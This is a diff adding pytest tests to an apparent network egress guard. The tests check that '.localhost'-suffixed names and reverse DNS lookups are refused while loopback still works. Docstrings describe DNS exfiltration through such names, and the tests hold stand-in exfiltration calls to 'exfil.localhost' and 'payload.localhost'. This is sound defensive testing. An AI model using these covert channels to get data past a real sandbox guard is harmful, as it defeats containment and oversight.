@@ -149,6 +149,47 @@ def test_a_dns_lookup_is_refused() -> None:
         socket.gethostbyname_ex("example.invalid")
 
 
+def test_a_localhost_suffix_name_is_refused() -> None:
+    """`x.localhost` is not loopback — the OS resolver decides what it points at.
+
+    The guard used to exempt any name ending in `.localhost`, but such a name resolves to whatever
+    the resolver (or `/etc/hosts`) says: measured, `connect(("exfil.localhost", 80))` reached a
+    public address, and `getaddrinfo("<payload>.localhost")` was permitted — DNS exfiltration
+    through a waved-through name. Only the exact string `localhost` and loopback IP literals pass.
+    """
+    with (
+        pytest.raises(egress.EgressForbidden, match=r"exfil\.localhost"),
+        socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client,
+    ):
+        client.connect(("exfil.localhost", 80))
+    with pytest.raises(egress.EgressForbidden, match=r"payload\.localhost"):
+        socket.getaddrinfo("payload.localhost", 80)
+
+
+def test_exact_localhost_and_loopback_ips_still_pass() -> None:
+    """Dropping the suffix rule must not touch the exact name or the loopback literals."""
+    assert socket.getaddrinfo("localhost", 0, socket.AF_INET)
+    assert socket.getaddrinfo("127.0.0.1", 0, socket.AF_INET)
+
+
+def test_a_reverse_lookup_is_refused() -> None:
+    """`getnameinfo`/`gethostbyaddr` resolve an address to a name — the same round trip, backwards.
+
+    Both were unpatched and completed with the guard armed; the address being resolved is the
+    covert channel, so both are refused now. Loopback addresses still resolve.
+    """
+    with pytest.raises(egress.EgressForbidden, match=r"203\.0\.113\.10"):
+        socket.getnameinfo(("203.0.113.10", 80), 0)
+    with pytest.raises(egress.EgressForbidden, match=r"203\.0\.113\.10"):
+        socket.gethostbyaddr("203.0.113.10")
+
+
+def test_reverse_lookup_of_loopback_still_works() -> None:
+    """A name for the server's own socket must still resolve."""
+    assert socket.getnameinfo(("127.0.0.1", 0), 0)
+    assert socket.gethostbyaddr("127.0.0.1")
+
+
 def test_resolving_loopback_still_works() -> None:
     """A guard that refused `localhost` would break every probe and in-process client here."""
     assert socket.getaddrinfo("127.0.0.1", 0, socket.AF_INET)
@@ -213,6 +254,8 @@ def test_disarm_restores_every_patched_call() -> None:
         with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as client:
             client.sendto(b"x", ("127.0.0.1", 9))
         socket.getaddrinfo("127.0.0.1", 0)
+        socket.getnameinfo(("127.0.0.1", 0), 0)
+        socket.gethostbyaddr("127.0.0.1")
         assert not egress.armed()
     finally:
         egress.arm()
